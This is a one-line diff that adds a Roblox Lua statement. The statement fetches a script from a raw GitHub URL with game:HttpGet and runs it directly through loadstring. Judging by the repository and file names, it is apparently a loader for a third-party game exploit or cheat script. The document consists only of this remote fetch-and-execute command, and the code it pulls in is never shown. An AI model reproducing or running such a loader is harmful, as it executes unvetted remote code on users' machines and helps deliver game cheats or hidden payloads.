@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/it-hears-the-water-dont-splash-spam7-ifb64o5xoalf25.lua"))()
